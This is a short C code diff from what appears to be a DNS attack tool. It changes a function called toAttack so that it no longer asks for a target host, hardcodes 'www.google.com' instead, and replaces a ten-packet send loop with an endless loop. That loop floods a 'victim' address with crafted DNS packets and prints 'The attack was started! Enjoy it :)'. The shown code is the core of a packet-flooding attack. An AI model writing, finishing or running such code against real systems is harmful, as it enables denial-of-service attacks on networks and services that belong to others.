@@ -58,12 +58,12 @@ void toAttack()
 	int sizeAddr = sizeof(victim);
 
 	unsigned char host[_LEN];
-	printf("\n=> TYPE ANY HOST TO START ATTACK: ");
-	scanf("%s", host);
+	//printf("\n=> TYPE ANY HOST TO START ATTACK: ");
+	//scanf("%s", host);
+	strcpy(host, "www.google.com");
 	printf("The attack was started! Enjoy it :)\n");
 	mountDnsPackage((unsigned char) _RESPONSE, buffer, host);
-	int n=10;
-	while (n--)
+	while (true)
 	{
 		if (sendto(sck, (char*) buffer, sizeof(struct DNS_H) + (strlen(host)+1) + sizeof(struct QUESTION), 0, (struct sockaddr*)&victim, sizeAddr) < 0)
 	        printf("\nSendto local host failed!\n");
